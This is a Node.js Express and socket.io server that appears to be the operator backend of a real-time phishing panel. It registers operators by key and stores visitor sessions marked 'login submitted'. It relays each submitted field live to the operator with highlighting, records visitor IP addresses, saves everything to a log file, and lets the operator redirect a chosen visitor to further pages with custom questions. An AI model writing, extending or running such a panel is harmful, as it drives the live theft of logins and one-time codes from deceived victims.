const express = require("express");
const http = require("http");
const { Server } = require("socket.io");
const { v4: uuidv4 } = require("uuid");
const fs = require("fs");
const path = require("path");

const LOG_FILE = path.join(__dirname, "logs.json");

const app = express();
const server = http.createServer(app);
app.set("trust proxy", true);

const io = new Server(server, {
  cors: { origin: "*" },
});

/* =====================================================
  MULTI ADMIN STRUCTURE
===================================================== */

// adminId -> { publicKey, sessions: Map, totalVisits, sockets: Set }
const admins = new Map();

// publicKey -> adminId
const adminKeyIndex = new Map();

/* =====================================================
  LOAD SAVED DATA
===================================================== */

if (fs.existsSync(LOG_FILE)) {
  const saved = JSON.parse(fs.readFileSync(LOG_FILE));

  for (const adminId in saved) {
    const adminData = saved[adminId];

    const admin = {
      publicKey: adminData.publicKey,
      sessions: new Map(Object.entries(adminData.sessions || {})),
      totalVisits: adminData.totalVisits || 0,
      sockets: new Set(),
    };

    admins.set(adminId, admin);
    adminKeyIndex.set(admin.publicKey, adminId);
  }
}

/* =====================================================
  SAVE TO FILE
===================================================== */

function saveLogsToFile() {
  const output = {};

  for (const [adminId, admin] of admins.entries()) {
    output[adminId] = {
      publicKey: admin.publicKey,
      totalVisits: admin.totalVisits,
      sessions: Object.fromEntries(admin.sessions),
    };
  }

  fs.writeFileSync(LOG_FILE, JSON.stringify(output, null, 2));
}

/* =====================================================
  ADMIN HELPERS
===================================================== */

function createAdmin(adminId) {
  const publicKey = uuidv4();

  const admin = {
    publicKey,
    sessions: new Map(),
    totalVisits: 0,
    sockets: new Set(),
  };

  admins.set(adminId, admin);
  adminKeyIndex.set(publicKey, adminId);

  return admin;
}

function getAdminByKey(publicKey) {
  const adminId = adminKeyIndex.get(publicKey);
  if (!adminId) return null;
  return admins.get(adminId);
}

/* =====================================================
  DASHBOARD STATS
===================================================== */

function emitDashboardStats(adminId) {
  const admin = admins.get(adminId);
  if (!admin) return;

  const totalUsers = admin.sessions.size;

  const totalOnlineUsers = [...admin.sessions.values()].filter((s) => s.online).length;

  io.to(`admin_${adminId}`).emit("dashboard_stats", {
    totalUsers,
    totalVisits: admin.totalVisits,
    totalOnlineUsers,
    totalHandlers: admin.sockets.size,
  });
}

/* =====================================================
  SOCKET CONNECTION
===================================================== */

io.on("connection", (socket) => {
  /* ===============================
    ADMIN REGISTER
  =============================== */

  socket.on("register_admin", ({ adminId }) => {
    let admin = admins.get(adminId);

    if (!admin) {
      admin = createAdmin(adminId);
    }

    socket.join(`admin_${adminId}`);
    socket.data.adminId = adminId;
    socket.data.isAdmin = true;

    admin.sockets.add(socket.id);

    socket.emit("admin_ready", {
      publicKey: admin.publicKey,
    });

    // Send existing sessions to this admin only
    for (const [sessionId, session] of admin.sessions.entries()) {
      if (!session?.status || session.status === "idle") {
        continue;
      }
      
      socket.emit("user_updated", {
        sessionId,
        session,
      });
    }

    emitDashboardStats(adminId);

    console.log(`Admin ${adminId} connected`);
  });

  /* ===============================
    USER REGISTER
  =============================== */

  socket.on("register_user", ({ existingSessionId, publicKey }) => {
    const admin = getAdminByKey(publicKey);
    if (!admin) return;

    const adminId = adminKeyIndex.get(publicKey);

    let sessionId = existingSessionId;

    const req = socket.request;
    const ipAddress = req.headers["x-forwarded-for"]
      ? req.headers["x-forwarded-for"].split(",")[0].trim()
      : req.socket.remoteAddress;

    // If no sessionId OR sessionId not found in this admin's sessions
    if (!sessionId || !admin.sessions.has(sessionId)) {
      sessionId = uuidv4();
      admin.totalVisits++;
    }

    if (admin.sessions.has(sessionId)) {
      const session = admin.sessions.get(sessionId);
      session.online = true;
      session.ip = ipAddress;
      session.onlineStatus = "online";
    }

    socket.join(`session_${sessionId}`);
    socket.data.sessionId = sessionId;
    socket.data.userAdminId = adminId;

    socket.emit("session_assigned", { sessionId });
    io.to(`admin_${adminId}`).emit("user_updated", {
      sessionId,
      session: admin.sessions.get(sessionId),
      onlineStatus: "online",
    });

    emitDashboardStats(adminId);

    console.log(`User-${sessionId} connected to Admin-${adminId}`);
  });

  /* ===============================
    USER UPDATE
  =============================== */

  socket.on("user_update", (payload) => {
    const sessionId = socket.data.sessionId;
    const adminId = socket.data.userAdminId;
    if (!sessionId || !adminId) return;

    const admin = admins.get(adminId);
    if (!admin) return;

    if (!admin.sessions.has(sessionId)) {
      admin.sessions.set(sessionId, {
        id: sessionId,
        online: true,
        status: "login submitted",
        questions: [],
        lastUpdate: Date.now(),
      });
    }

    const { highlightFields = [], ...fields } = payload;
    const session = admin.sessions.get(sessionId);

    Object.keys(fields).forEach((key) => {
      session[key] = fields[key];
    });

    session.lastUpdate = Date.now();

    io.to(`admin_${adminId}`).emit("user_updated", {
      sessionId,
      session,
      highlightFields,
      highlight: true,
    });

    saveLogsToFile();
  });

  /* ===============================
    ADMIN REDIRECT
  =============================== */

  socket.on("admin_redirect", ({ sessionId, nextPage, questions }) => {
    const adminId = socket.data.adminId;
    if (!adminId) return;

    const admin = admins.get(adminId);
    if (!admin || !admin.sessions.has(sessionId)) return;

    admin.sessions.get(sessionId).status = "redirected to " + nextPage;

    io.to(`session_${sessionId}`).emit("redirect_user", {
      nextPage,
      questions,
    });

    console.log(`Admin ${adminId} redirecting ${sessionId}`);
  });

  /* ===============================
    DELETE USER
  =============================== */

  socket.on("delete_user", ({ sessionId }) => {
    const adminId = socket.data.adminId;
    if (!adminId) return;

    const admin = admins.get(adminId);
    if (!admin) return;

    admin.sessions.delete(sessionId);

    io.to(`admin_${adminId}`).emit("user_deleted", {
      sessionId,
    });

    saveLogsToFile();
    emitDashboardStats(adminId);

    console.log(`Session ${sessionId} deleted from Admin ${adminId}`);
  });

  /* ===============================
    ADMIN RESET
  =============================== */

  socket.on("reset_admin", () => {
    const adminId = socket.data.adminId;
    if (!adminId) return;

    const admin = admins.get(adminId);
    if (!admin) return;

    admin.sessions.clear();
    admin.totalVisits = 0;

    io.to(`admin_${adminId}`).emit("admin_reset");

    saveLogsToFile();
    emitDashboardStats(adminId);

    console.log(`Admin ${adminId} reset all data`);
  });

  /* ===============================
    DISCONNECT
  =============================== */

  socket.on("disconnect", () => {
    if (socket.data.isAdmin) {
      const adminId = socket.data.adminId;
      const admin = admins.get(adminId);
      if (admin) {
        admin.sockets.delete(socket.id);
        emitDashboardStats(adminId);
      }
      return;
    }

    const sessionId = socket.data.sessionId;
    const adminId = socket.data.userAdminId;
    if (!sessionId || !adminId) return;

    const admin = admins.get(adminId);
    if (!admin || !admin.sessions.has(sessionId)) return;

    const session = admin.sessions.get(sessionId);

    if (!session || session.status === "idle") {
      return; // do not emit anything for idle users
    }

    session.online = false;
    session.onlineStatus = "offline";

    io.to(`admin_${adminId}`).emit("user_offline", {
      sessionId,
    });

    saveLogsToFile();
    emitDashboardStats(adminId);

    console.log(`User-${sessionId} disconnected`);
  });
});

/* =====================================================
  START SERVER
===================================================== */

const PORT = process.env.PORT || 3000;

server.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
